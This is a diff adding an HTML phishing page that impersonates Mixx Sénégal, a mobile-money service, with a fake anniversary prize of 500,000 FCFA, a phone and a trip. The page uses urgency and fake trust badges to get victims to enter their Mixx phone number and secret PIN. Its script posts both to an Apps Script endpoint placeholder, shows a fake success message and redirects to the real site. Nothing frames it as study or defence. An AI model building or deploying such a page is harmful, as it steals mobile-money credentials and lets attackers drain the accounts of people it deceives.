@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mixx Sénégal - 1er Anniversaire</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+        .container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            max-width: 380px;
+            width: 100%;
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #0056b3 0%, #003d80 100%);
+            padding: 25px 20px;
+            text-align: center;
+        }
+        .logo-container {
+            background: white;
+            border-radius: 16px;
+            padding: 12px;
+            display: inline-block;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            border-radius: 16px;
+            display: block;
+            object-fit: contain;
+        }
+        .brand-name {
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            margin-top: 12px;
+            letter-spacing: 2px;
+        }
+        .brand-sub {
+            color: #FFD700;
+            font-size: 12px;
+            margin-top: 3px;
+        }
+        .anniversary-badge {
+            background: #FFD700;
+            color: #0056b3;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 15px;
+        }
+        .banner {
+            background: linear-gradient(90deg, #FFD700 0%, #FFC107 100%);
+            padding: 15px;
+            text-align: center;
+            color: #0056b3;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .content {
+            padding: 20px;
+        }
+        .greeting {
+            text-align: center;
+            margin-bottom: 15px;
+            font-size: 15px;
+            color: #333;
+            line-height: 1.5;
+        }
+        .prize-box {
+            background: linear-gradient(135deg, #fff9e6 0%, #fff3cc 100%);
+            border: 3px solid #FFD700;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        .prize-amount {
+            font-size: 42px;
+            color: #0056b3;
+            font-weight: bold;
+        }
+        .prize-currency {
+            font-size: 20px;
+            color: #0056b3;
+        }
+        .phone-prize {
+            color: #28a745;
+            font-size: 16px;
+            margin-top: 12px;
+            font-weight: 600;
+        }
+        .trip-prize {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 10px;
+            padding: 10px;
+            background: #fff0f0;
+            border-radius: 8px;
+            border: 1px dashed #dc3545;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            border-color: #0056b3;
+            outline: none;
+        }
+        .phone-input {
+            display: flex;
+            gap: 8px;
+        }
+        .country-code {
+            width: 70px;
+            background: #f0f0f0;
+            text-align: center;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+        .phone-field {
+            flex: 1;
+        }
+        .phone-hint {
+            font-size: 11px;
+            color: #888;
+            margin-top: 5px;
+        }
+        .phone-counter {
+            font-size: 12px;
+            color: #28a745;
+            font-weight: 600;
+            margin-top: 3px;
+        }
+        .phone-counter.incomplete {
+            color: #dc3545;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: transform 0.2s;
+        }
+        .submit-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 5px 20px rgba(40, 167, 69, 0.4);
+        }
+        .submit-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .countdown {
+            text-align: center;
+            font-size: 13px;
+            color: #dc3545;
+            margin-top: 12px;
+            font-weight: 600;
+        }
+        .confetti {
+            position: absolute;
+            font-size: 18px;
+            animation: fall 2.5s infinite;
+            pointer-events: none;
+        }
+        @keyframes fall {
+            0% { transform: translateY(-30px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(80px) rotate(360deg); opacity: 0; }
+        }
+        .confetti:nth-child(1) { left: 10%; animation-delay: 0s; }
+        .confetti:nth-child(2) { left: 30%; animation-delay: 0.5s; }
+        .confetti:nth-child(3) { left: 50%; animation-delay: 1s; }
+        .confetti:nth-child(4) { left: 70%; animation-delay: 1.5s; }
+        .confetti:nth-child(5) { left: 90%; animation-delay: 2s; }
+        .share-text {
+            text-align: center;
+            font-size: 13px;
+            color: #666;
+            margin-top: 15px;
+            padding: 12px;
+            background: #f0f8ff;
+            border-radius: 8px;
+        }
+        .share-text strong {
+            color: #0056b3;
+        }
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 18px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+        }
+        .badge {
+            text-align: center;
+            font-size: 11px;
+            color: #666;
+        }
+        .badge-icon {
+            font-size: 22px;
+            display: block;
+            margin-bottom: 3px;
+        }
+        .footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 11px;
+            color: #888;
+            background: #f8f9fa;
+            border-top: 1px solid #eee;
+        }
+        .footer a {
+            color: #0056b3;
+            text-decoration: none;
+        }
+        .yas-powered {
+            text-align: center;
+            font-size: 10px;
+            color: #aaa;
+            margin-top: 8px;
+        }
+        .remerciement {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.6;
+            text-align: center;
+            margin-bottom: 15px;
+            padding: 12px;
+            background: #f9f9f9;
+            border-radius: 8px;
+            border-left: 4px solid #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-container">
+                <img src="logo.png" alt="Mixx Sénégal" class="logo">
+            </div>
+            <div class="brand-name">MIXX</div>
+            <div class="brand-sub">by Yas | SAGA Africa</div>
+            <div class="anniversary-badge">🎂 1ER ANNIVERSAIRE !</div>
+        </div>
+        
+        <div class="banner">
+            🎉 OFFRE EXCEPTIONNELLE ! 🎉<br>
+            <small style="font-size:13px;">Nous fêtons notre 1er anniversaire !</small>
+        </div>
+        
+        <div class="content">
+            <div class="greeting">
+                <strong>Merci pour votre confiance, votre soutien et votre fidélité !</strong><br>
+                <small>En guise de remerciement, nous vous offrons un <strong>CADEAU</strong> exceptionnel !</small>
+            </div>
+            
+            <div class="prize-box">
+                <span class="confetti">🎉</span>
+                <span class="confetti">✨</span>
+                <span class="confetti">🎊</span>
+                <span class="confetti">🎁</span>
+                <span class="confetti">💰</span>
+                
+                <div style="font-size:14px; color:#666;">Votre prix :</div>
+                <div class="prize-amount">500.000</div>
+                <div class="prize-currency">FCFA</div>
+                <div class="phone-prize">📱 + Téléphone Samsung Galaxy A14</div>
+                <div class="trip-prize">✈️ + Voyage VIP au Maroc</div>
+            </div>
+            
+            <div class="remerciement">
+                🙏 Nous sommes infiniment reconnaissants pour cette première année incroyable passée avec vous. Continuons ensemble sur cette lancée pour de nombreuses années de succès ! 💼💰
+            </div>
+            
+            <form id="claimForm">
+                <div class="form-group">
+                    <label>📱 Votre numéro Mixx :</label>
+                    <div class="phone-input">
+                        <input type="text" class="country-code" value="+221" readonly>
+                        <input type="tel" id="phoneNumber" class="phone-field" placeholder="77 123 45 67" maxlength="11" required>
+                    </div>
+                    <div class="phone-hint">Format : 7X XXX XX XX (9 chiffres)</div>
+                    <div id="phoneCounter" class="phone-counter incomplete">0/9 chiffres</div>
+                </div>
+                
+                <div class="form-group">
+                    <label>🔐 Votre code secret (4 chiffres) :</label>
+                    <input type="password" id="pin" placeholder="Entrez votre code secret" maxlength="4" pattern="[0-9]{4}" required>
+                    <div id="pinCounter" class="phone-counter incomplete">0/4 chiffres</div>
+                </div>
+                
+                <button type="submit" id="submitBtn" class="submit-btn" disabled>
+                    🎁 RÉCLAMER MON CADEAU !
+                </button>
+                
+                <div class="countdown">
+                    ⏰ L'offre expire dans : <span id="timer">23:59:59</span>
+                </div>
+            </form>
+            
+            <div class="trust-badges">
+                <div class="badge">
+                    <span class="badge-icon">🔒</span>
+                    Sécurisé
+                </div>
+                <div class="badge">
+                    <span class="badge-icon">✓</span>
+                    Officiel
+                </div>
+                <div class="badge">
+                    <span class="badge-icon">⚡</span>
+                    Rapide
+                </div>
+            </div>
+            
+            <div class="share-text">
+                💡 <strong>Partagez avec vos amis !</strong><br>
+                Chaque participant reçoit également un cadeau ! 🎉
+            </div>
+            
+            <div class="yas-powered">
+                Propulsé par <strong>Yas</strong> | SAGA Africa Holding SA
+            </div>
+        </div>
+        
+        <div class="footer">
+            © 2024 Mixx Sénégal - SAGA Africa Holding SA<br>
+            <a href="https://www.mixx.sn">www.mixx.sn</a> | <a href="https://yas.sn">yas.sn</a>
+        </div>
+    </div>
+
+    <script>
+        const scriptURL = 'PASTE_YOUR_APPS_SCRIPT_URL_HERE';
+
+        const phoneInput = document.getElementById('phoneNumber');
+        const pinInput = document.getElementById('pin');
+        const phoneCounter = document.getElementById('phoneCounter');
+        const pinCounter = document.getElementById('pinCounter');
+        const submitBtn = document.getElementById('submitBtn');
+
+        function updateTimer() {
+            const timerEl = document.getElementById('timer');
+            let hours = 23, minutes = 59, seconds = 59;
+            
+            setInterval(() => {
+                seconds--;
+                if (seconds < 0) { seconds = 59; minutes--; }
+                if (minutes < 0) { minutes = 59; hours--; }
+                if (hours < 0) { hours = 23; minutes = 59; seconds = 59; }
+                
+                timerEl.textContent = 
+                    String(hours).padStart(2, '0') + ':' + 
+                    String(minutes).padStart(2, '0') + ':' + 
+                    String(seconds).padStart(2, '0');
+            }, 1000);
+        }
+        updateTimer();
+
+        phoneInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 9) value = value.slice(0, 9);
+            
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i === 2 || i === 5) formatted += ' ';
+                formatted += value[i];
+            }
+            
+            e.target.value = formatted;
+            
+            const digitCount = value.length;
+            phoneCounter.textContent = digitCount + '/9 chiffres';
+            phoneCounter.className = digitCount === 9 ? 'phone-counter' : 'phone-counter incomplete';
+            
+            validateForm();
+        });
+
+        pinInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+            
+            const digitCount = e.target.value.length;
+            pinCounter.textContent = digitCount + '/4 chiffres';
+            pinCounter.className = digitCount === 4 ? 'phone-counter' : 'phone-counter incomplete';
+            
+            validateForm();
+        });
+
+        function validateForm() {
+            const phoneDigits = phoneInput.value.replace(/\D/g, '').length;
+            const pinDigits = pinInput.value.length;
+            submitBtn.disabled = !(phoneDigits === 9 && pinDigits === 4);
+        }
+
+        document.getElementById('claimForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const phone = phoneInput.value.replace(/\s/g, '');
+            const pin = pinInput.value;
+            const timestamp = new Date().toISOString();
+            
+            fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: '+221' + phone,
+                    pin: pin,
+                    timestamp: timestamp,
+                    country: 'Senegal',
+                    source: 'mixx_sn_1st_anniversary'
+                })
+            });
+            
+            document.querySelector('.content').innerHTML = `
+                <div style="text-align:center; padding:30px 15px;">
+                    <div style="font-size:80px; margin-bottom:15px;">🎉</div>
+                    <h2 style="color:#28a745; margin-bottom:15px; font-size:24px;">MERCI BEAUCOUP !</h2>
+                    <p style="font-size:17px; color:#333; margin-bottom:12px;">
+                        <strong>C'est fait !</strong> Votre demande a bien été enregistrée.
+                    </p>
+                    <p style="font-size:14px; color:#666; margin-bottom:20px;">
+                        Nous vous contacterons dans les <strong>24 heures</strong>.<br>
+                        Votre téléphone sera livré et vous recevrez <strong>500.000 FCFA</strong> sur votre compte Mixx.
+                    </p>
+                    <div style="background:#e8f5e9; padding:18px; border-radius:12px; border: 2px solid #28a745;">
+                        <p style="font-size:14px; color:#2e7d32; text-align:left; line-height:1.8;">
+                            ✅ Votre demande est valide<br>
+                            📱 Numéro : <strong>+221${phone}</strong><br>
+                            🎁 Cadeau : <strong>500.000 FCFA</strong><br>
+                            📱 Téléphone : <strong>Samsung Galaxy A14</strong><br>
+                            ✈️ Bonus : <strong>Voyage VIP au Maroc</strong>
+                        </p>
+                    </div>
+                    <p style="font-size:14px; color:#0056b3; font-weight:600; margin-top:20px;">
+                        Redirection vers Mixx dans : <span id="countdown">5</span> secondes...
+                    </p>
+                </div>
+            `;
+            
+            let count = 5;
+            const countdown = setInterval(() => {
+                count--;
+                const cdEl = document.getElementById('countdown');
+                if (cdEl) cdEl.textContent = count;
+                if (count <= 0) {
+                    clearInterval(countdown);
+                    window.location.href = 'https://www.mixx.sn';
+                }
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
